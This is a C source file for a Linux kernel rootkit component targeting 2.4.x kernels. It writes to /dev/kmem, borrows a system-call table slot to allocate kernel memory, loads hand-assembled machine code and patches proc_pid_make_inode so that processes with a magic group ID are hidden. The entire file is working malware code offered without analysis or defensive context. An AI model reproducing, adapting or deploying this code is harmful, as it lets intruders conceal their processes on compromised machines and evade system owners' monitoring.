/* inject our proc-hiding code via /dev/kmem */
/* works on kernels 2.4.x < 22 */

#include <stdio.h>
#include <fcntl.h>

#define   MAGIC_GID             0x11

#define   FUNC_OFFS     0xc0154bb0  // proc_pid_make_inode
#define   GID_OFFS          0xc0120170  // getgid
#define   GFP_OFFS          0xc011cc10  // __request_region
#define   SYS_CALL_TABLE_OFFS   0xc02fe7d0  // sys_call_table
#define   KMALLOC_OFFS      0xc012ec20  // kmalloc

unsigned char hell[] =
    "\xe8"
    "\xde\xfa\xce\xd0"  // address of getgid()
    "\x83\xf8\x11\x74\x0c"

    "\x83\xbf"
    "\xde\xfa\xce\xd0"  // offset to task_struct->gid
    "\x11" // magic gid
    "\x75\x03\x31\xc0\xc3\x68"
    "\xde\xfa\xce\xd0"  // address of original call()
    "\xc3";

unsigned int gfp, gid, kaddr = 0, oaddr = 0, call_addr = 0;


/* grab task_struct->gid offset from getgid() syscall */
int get_gid_offs(int fd)
{
    int i, st, gid;
    unsigned char p, sig[] = "\x8b\x80";

    lseek(fd, GID_OFFS, 0);
    
    st = 0;
    for (i=0; i < 20; i++)
    {
    read(fd, &p, 1);
    if (p == 0xc3) break;
    
    if (p == sig[st]) st++;
    else st = 0;
    
    if (st == 2) break;
    }

    if (st < 2) return 0;

    read(fd, &gid, 4);
    printf("[+] Gid offset: 0x%x\n", gid);

    return gid;
}


int get_orig_addr(int fd)
{
    int i=0, ret = 0;
    unsigned char u = 0;
    
    lseek(fd, FUNC_OFFS, 0);

    while (i++ < 32 && u != 0xe8)
    read(fd, &u, 1);

    if (i >= 32) return 0;

    call_addr = FUNC_OFFS + i - 1;

    read(fd, &ret, 4);
    return ret;
}


int get_kern_gfp(int fd)
{
    int i, gfp;
    unsigned char p;
    
    lseek(fd, GFP_OFFS, 0);
    for (i=0; i < 20; i++)
    {
        read(fd, &p, 1);
    
    if (p == 0x68) break;
    }
     
    if (i == 20) return 0; // not found
    read(fd, &gfp, 4);
    printf("[+] GFP_KERNEL = 0x%x\n", gfp);
    
    return gfp;
}


int kmalloc(int fd, int gfp_kern)
{
    int addr, n_addr, ret = 0;
    
    lseek(fd, SYS_CALL_TABLE_OFFS + 4*233, 0);
    read(fd, &addr, 4);
    lseek(fd, -4, 1);
    
    n_addr = KMALLOC_OFFS;
    write(fd, &n_addr, 4);
    
    ret = syscall(233, 32, gfp_kern);
    printf("[+] kmalloc ret = 0x%x\n", ret);
    
    lseek(fd, SYS_CALL_TABLE_OFFS + 4*233, 0);
    write(fd, &addr, 4); // backup

    return ret;
}


int kmem_load_hellcode(int fd, void *dat, unsigned int size)
{
    lseek(fd, kaddr, 0);
    printf("[+] loading hellcode into kernel\n");
    return write(fd, dat, size);
}


int kmem_hook(int fd)
{
    int a;
    
    lseek(fd, call_addr, 0);

    a = kaddr - (call_addr+4);

    write(fd, &a, 4);
    printf("[+] infected done\n");
    
    return 0;
}


int main()
{
    int fd;
    unsigned char tmp[4];
    
    fd = open("/dev/kmem", O_RDWR);
    
    if (fd < 0)
    {
    perror("open");
    return -1;
    }

    gid = gfp = kaddr = 0;

// get gid offs and prepare hellcode

    gid = get_gid_offs(fd);
    if (gid == 0)
    {
    printf("[-] cant find gid offset in task_struct\n");
    return -2;
    }

    memcpy(&tmp, &gid, 4);
    hell[12] = tmp[0];
    hell[13] = tmp[1];
    hell[14] = tmp[2];
    hell[15] = tmp[3];

    hell[16] = MAGIC_GID;

    oaddr = get_orig_addr(fd);
    if (oaddr == 0)
    {
    printf("[-] cant find call() opcode\n");
    return -2;
    }

    oaddr += call_addr+4;
    printf("[+] orig_call = 0x%x\n", oaddr);
    memcpy(&tmp, &oaddr, 4);
    hell[23] = tmp[0];
    hell[24] = tmp[1];
    hell[25] = tmp[2];
    hell[26] = tmp[3];

// alloc space in kernel memory

    gfp = get_kern_gfp(fd);
    if (gfp == 0)
    {
    printf("[-] cant get value of GFP_KERNEL\n");
    return -3;
    }

    kaddr = kmalloc(fd, gfp);
    if (kaddr == 0)
    {
    printf("[-] cant allocate space in kernel memory\n");
    return -4;
    }

// let's go

    gid = GID_OFFS - (kaddr+5);
    memcpy(&tmp, &gid, 4);
    hell[1] = tmp[0];
    hell[2] = tmp[1];
    hell[3] = tmp[2];
    hell[4] = tmp[3];

    if (kmem_load_hellcode(fd, &hell, sizeof(hell)) < sizeof(hell))
    {
    printf("[-] cant load shellcode into kernel memory\n");
    return -5;
    }

    kmem_hook(fd);

    close(fd);
    return 0;
}
